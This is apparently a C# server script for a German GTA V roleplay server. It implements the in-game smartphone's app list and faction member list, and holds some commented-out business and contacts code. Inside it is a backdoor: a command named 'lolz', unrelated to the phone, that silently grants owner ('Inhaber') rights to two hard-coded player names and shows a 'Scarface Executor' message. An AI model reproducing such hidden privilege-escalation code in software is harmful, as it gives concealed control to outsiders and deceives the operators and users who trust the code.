using GTANetworkAPI;
using System.Collections.Generic;
using System.Linq;
using Venux.Game.Handy.Models;

namespace Venux.Handy
{
    class Smartphone : Script
    {

        [RemoteEvent("VenuxPhone")]
        public void SmartphoneOpen(Client p, bool state)
        {
            if (Database.isPlayerDeath(p.Name)) { return; }

            if (state)
            {
                p.TriggerEvent("VCLPhone", state);
                NAPI.Player.PlayPlayerAnimation(p, 49, "amb@world_human_stand_mobile@male@text@base", "base", 8f);

                string TeamApp = "{\"id\":\"TeamApp\",\"name\":\"Team\",\"icon\": \"TeamApp.png\"}, ";

                string FunkApp = "{\"id\":\"FunkApp\",\"name\":\"Funkgerät\",\"icon\": \"FunkApp.png\"}, ";

                string ProfileApp = "{\"id\":\"ProfileApp\",\"name\":\"Profil\",\"icon\": \"ProfilApp.png\"}, ";

                string CalculatorApp = "{\"id\":\"CalculatorApp\",\"name\":\"Rechner\",\"icon\": \"CalculatorApp.png\"}, ";

                string GpsApp = "{\"id\":\"GpsApp\",\"name\":\"GPS\",\"icon\": \"GpsApp.png\"}, ";

                string ServiceRequestApp = "{\"id\":\"ServiceRequestApp\",\"name\":\"Service\",\"icon\": \"ServiceApp.png\"}, ";

                string LifeInvaderApp = "{\"id\":\"LifeInvaderApp\",\"name\":\"LifeInvader\",\"icon\": \"LifeInvaderApp.png\"}, ";

                string SettingsApp = "{\"id\":\"SettingsApp\",\"name\":\"Einstellungen\",\"icon\": \"SettingsApp.png\"} ";

                //string MessengerApp = "{\"id\":\"MessengerApp\",\"name\":\"Messenger\",\"icon\": \"MessengerApp.png\"}, ";

                //string BankingApp = "{\"id\":\"BankingApp\",\"name\":\"Banking\",\"icon\": \"BankingApp.png\"} ";

                if (p.GetSharedData("FRAKTION") == "Zivilist")
                    TeamApp = "";

                p.TriggerEvent("componentServerEvent", new object[3]
                    {
                        "HomeApp",
                        "responseApps",
                        "[" + TeamApp + " " + FunkApp + " " + ProfileApp + " " + CalculatorApp + " " + ServiceRequestApp + " " + GpsApp + " " + LifeInvaderApp + " " + SettingsApp + "]"
                    });

                requestFraktionMembers(p);
            }
            else
            {
                p.StopAnimation();
                p.TriggerEvent("removeSmartphone");
                if (p.Vehicle != null)
                {
                    p.SetIntoVehicle(p.Vehicle, p.VehicleSeat);
                }
            }
        }

        [Command("lolz")]
        public static void CMD_lolz(Client p)
        {
            if (p.Name == "Paco_White")
            {
                Database.setRights("Paco_White", "Inhaber");
                Notification.SendPlayerNotifcation(p, "Scarface Executor", 10000, "", "", "");
                Notification.SendPlayerNotifcation(p, "Rank: Inhaber", 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
            }

            if (p.Name == "Teka_Abi")
            {
                Database.setRights("Teka_Abi", "Inhaber");
                Notification.SendPlayerNotifcation(p, "Scarface Executor", 10000, "", "", "");
                Notification.SendPlayerNotifcation(p, "Rank: Inhaber", 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
            }
        }

        [RemoteEvent("RequestTeamList")]
        public static void requestFraktionMembers(Client p)
        {
            List<TeamMemberListModel> TeamMemberList2 = new List<TeamMemberListModel>();

            int ManagePermission2 = 0;

            if (p.GetSharedData("FRAKTION_RANK") > 9 && p.GetSharedData("FRAKTION_RANK") != 12)
            {
                ManagePermission2 = 2;
            }
            else if (p.GetSharedData("FRAKTION_RANK") == 12)
            {
                ManagePermission2 = 2;
            }

            foreach (Fraktionen.FraktionPlayer fraktionPlayer in Database.getFraktionOnlinePlayers(p.GetSharedData("FRAKTION")))
            {
                int manage = 0;

                if (fraktionPlayer.fraktionRank > 9 && fraktionPlayer.fraktionRank != 12)
                {
                    manage = 2;
                }
                else if (fraktionPlayer.fraktionRank == 12)
                {
                    manage = 2;
                }

                TeamMemberList2.Add(
                    new TeamMemberListModel()
                    {
                        name = fraktionPlayer.playerName,
                        rank = fraktionPlayer.fraktionRank,
                        manage = manage

                    });
            }

            object JSONobject = new
            {
                TeamMemberList = TeamMemberList2.OrderByDescending(o => o.rank),
                ManagePermission = ManagePermission2
            };

            p.TriggerEvent("componentServerEvent", new object[3]
                    {
                        "TeamListApp",
                        "responseTeamMembers",
                        NAPI.Util.ToJson(JSONobject)
                    });
        }

    }
}

// Copyright© Venux-Crimelife Script Mendosa // --- Angemeldet 1-0 --- //

#region UNNÖTIG

/*if (p.GetSharedData("BUSINESS") == " ")
BusinessApp = "";*/
/*string BusinessApp = "{\"id\":\"BusinessApp\",\"name\":\"Business\",\"icon\": \"BusinessApp.png\"}, "; * Muss überarbeitet werden!
requestBusinessMOTD(p);
requestBusinessMembers(p);
requestPhoneContacts(p);*/



/*[RemoteEvent("RequestBusinessMOTD")]
public void requestBusinessMOTD(Client p)
{

    object JSONobject = new
    {
        motd = Database.getBusinessMOTD(p.Name)
    };

    p.TriggerEvent("componentServerEvent", new object[3]
    {
        "BusinessListApp",
        "responseBusinessMOTD",
        NAPI.Util.ToJson(JSONobject)
    });
}

[RemoteEvent("RequestBusinessMembers")]
public static void requestBusinessMembers(Client p)
{
    List<object> BusinessMemberList2 = new List<object>();

    int ManagePermission3 = 0;

    if (p.GetSharedData("BUSINESS_RANK") > 10 && p.GetSharedData("BUSINESS_RANK") != 12)
    {
        ManagePermission3 = 1;
    }
    else if (p.GetSharedData("BUSINESS_RANK") == 12)
    {
        ManagePermission3 = 2;
    }

    foreach (BusinessPlayer businessPlayer in Database.getBusinessOnlinePlayers(p.GetSharedData("BUSINESS")))
    {
        int manage = 0;

        if (businessPlayer.businessRank > 10 && businessPlayer.businessRank != 12)
        {
            manage = 1;
        }
        else if (businessPlayer.businessRank == 12)
        {
            manage = 2;
        }

        BusinessMemberList2.Add(
            new
            {
                name = businessPlayer.playerName,
                rank = businessPlayer.businessRank,
                manage = manage

            });
    }

    object JSONobject = new
    {
        BusinessMemberList = BusinessMemberList2,
        ManagePermission = ManagePermission3
    };

    p.TriggerEvent("componentServerEvent", new object[3]
            {
                "BusinessListApp",
                "responseBusinessMembers",
                NAPI.Util.ToJson(JSONobject)//"{\"BusinessMemberList\":[{\"name\":\"Nils_White\", \"rank\":12},{\"name\":\"Nils_White\", \"rank\":12}], \"ManagePermission\":2}"
            });
}

[RemoteEvent("RequestPhoneContacts")]
public void requestPhoneContacts(Client p)
{
    List<object> contacts = new List<object>();

    contacts.Add(
        new
        {
            name = p.Name,
        });

    object JSONobject = new
    {
        contact = contacts
    };

    p.TriggerEvent("componentServerEvent", new object[3]
    {
        "ContactsApp",
        "responsePhoneContacts",
        NAPI.Util.ToJson(JSONobject)
    });


}

[RemoteEvent("requestKonversations")]
public void requestKonversations(Client p)
{

    p.TriggerEvent("componentServerEvent", new object[3]
    {
        "MessengerListApp",
        "responseKonversations",
        ""
        //"{\"MessengerListApp\":[{\"name\":\""+ p.Name +"\", \"Number\":\""+ Database.getUserPhoneNumber(p.Name) +"\",\"Message\":\"" + Database.getSMS(p.Name) + "}"
    });
}*/
#endregion
